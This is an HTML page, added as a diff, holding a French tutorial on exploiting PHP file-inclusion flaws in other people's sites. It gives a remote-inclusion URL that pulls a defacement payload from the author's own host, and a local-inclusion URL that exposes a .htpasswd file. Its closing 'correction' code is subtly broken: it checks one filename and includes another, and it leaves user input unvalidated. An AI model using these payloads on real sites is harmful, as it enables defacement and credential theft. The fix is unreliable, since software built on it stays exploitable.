@@ -1,0 +1,108 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>Document sans titre</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#000000" text="#FFFFFF" link="#FFFFFF" vlink="#FFFFFF" alink="#FFFFFF">
+<div align="center">
+  <h1>La Faille include
+  </h1>
+</div>
+<h2>1) Quesque c'est t'y cette chose ?</h2>
+<p><br>
+  La faille include c'est la possibilit&eacute; d'inserer du code malveillant
+  dans une page deja existante.<br>
+  Je traduit =&gt; si vous trouvez une faille include sur un site, vous pourrez
+  faire a peu pres tout ce que vous voudrez avec !</p>
+<h2>2) pr&eacute;sentation</h2>
+<p><br>
+  Tout d'abord qu'est ce que ce &quot;include&quot; dans &quot;faille include&quot; et
+  bien, les include sont les outils des fegnants !<br>
+  Au lieu de repeter des centaines de fois la meme protion de code, on cr&eacute;er
+  une page &quot;portion_de_code.php&quot; puis on l'inclus<br>
+  la ou en a besoin grace a la commande &quot;include&quot;.<br>
+  exemple =&gt;</p>
+<p>&lt;?<br>
+  // code quelquonque ...<br>
+  // didonc, ici j'aurais bien besoin du code long et chian que je doit mettre
+  au moins 10 fois dans toute les pages de <br>
+  // mon site !<br>
+  //<br>
+  // A mais j'alais oublier, c'est cool alors ! Je n'ai pas besoin de me faire
+  chier a le taper, vue que le l'ai mit dans la<br>
+  // page &quot;code_long_et_chiant_a_taper.php&quot; !!</p>
+<p>$page_a_inclure = &quot;code_long_et_chiant_a_taper.php&quot;; // je stoque
+  le nom du fichier dans une variable (dans une boite)<br>
+  include(&quot;$page_a_inclure&quot;); // et je l'inclut ! </p>
+<p>// Cool je ne me suis pas fait chier a taper tout le code ! A la place, j'ai
+  tap&eacute; que 2 mini-ligne de code ! cooool<br>
+  ?&gt;</p>
+<h2><br>
+  3) Exploitation</h2>
+<p>alors, c'est bien zoli tout ca mais comment voit on si une page est incluse
+  ?<br>
+  regardez l'adresse suivante :</p>
+<p>http://siteouaib.com/index.php?page=coolCaAlors.php</p>
+<p>remarquez bien le &quot;page=coolCaAlors.php&quot;<br>
+  La page &quot;coolCaAlors.php&quot; a &eacute;t&eacute; incluse !!</p>
+<p>Cela ne veut pas dire pour autant que le site est vulnerable ! Alors procedons
+  a un test :<br>
+  a la place de :<br>
+  http://siteouaib.com/index.php?page=coolCaAlors.php<br>
+  essayez<br>
+  http://siteouaib.com/index.php?page=http://www.google.com</p>
+<p>si google s'affiche au beau milieu de la page, c'est que le site est vulnerable
+  !<br>
+  C'est donc la que reside cette faille , dans le fait que l'on peut inclure
+  n'importe quel page au sein d'une autre </p>
+<p>si on met :</p>
+<p>http://sitealacon.com/index.php?page=http://www.http://users.rockweb.org/Raven45</p>
+<p>Le site sera inser&eacute; dans index , si ce n'est pas le cas c'est donc
+  que la faille est bouch&eacute;e<br>
+  Cette faille donc va nous permettre d'inserer un code malveillant venant d'un
+  autre site sinon mieu du notre ^^<br>
+  ex : sur mon site je cr&eacute;e un fichier inc.php et dedans je met :</p>
+<p>&lt;?<br>
+  $fichier=fopen('index.php','a'); //cette ligne ouvre le fichier index.php<br>
+  fwrite($Fichier,'Web Site Defaced'); // Cette ligne ecrit dans index.php<br>
+  fclose($fichier); // On ferme le fichier , Facultatif<br>
+  ?&gt; </p>
+<p>Donc on a cette page sur notre serveur que je nomerai http://toto.fr<br>
+  Maintenant on procede a l'inclusion :<br>
+  http://sitealacon.com/index.php?page=http://toto.fr/inc</p>
+<p>Et voila le site est &quot;defac&eacute;&quot;, du moins, la page principale
+  a &eacute;t&eacute; modifi&eacute; pour simuler un defacage vu que les autre
+  page sur<br>
+  le serveur sont intactes !</p>
+<p>C'est ti pas bo tout ca ?</p>
+<p>Mais attention !! il ne faux pas mettre :<br>
+  http://sitealacon.com/index.php?page=http://toto.fr/inc.php <br>
+  mais <br>
+  http://sitealacon.com/index.php?page=http://toto.fr/inc <br>
+  car sinon le fichier sera interpr&eacute;ter sur votre serveur !!</p>
+<h2>4) L'include local</h2>
+<p><br>
+  Sachez que grace a la faille include, vous pouvez aussi inclure des fichier
+    interessant pr&eacute;sent sur le serveur cible ! (passwd.txt, htacces, htpassd,
+    la DB ...etc.)<br>
+  un exemple suffira a vous faire comprendre :</p>
+<p>http://sitealacon.com/index.php?page=protect/.htpasswd </p>
+<p>Et tadaa, htpasswd s'affiche au beau milieu de la page !</p>
+<h2>5) Correction de la faille</h2>
+<p>C'est bien joli de s'avoir l'exploiter cette faille, mais encore faudrait
+  il savoir la corriger !!<br>
+  Au lieu de mettre le code de l'exemple on va remplacer par ca :</p>
+<p>QUOTE<br>
+  &lt;
+  ?<br>
+  $page_a_inclure = &quot;code_long_et_chiant_a_taper.php&quot;;<br>
+  if (file_exists($page_a_inclure)) { //verifie si le fichier existe bien sur
+  le serveur<br>
+  include(&quot;$page_a_inclure.php&quot;); //inclus la page EN PHP <br>
+  }<br>
+  else {include(&quot;404.php&quot;);} //inclusion d'une page d'erreur<br>
+  ?&gt;</p>
+</body>
+</html>
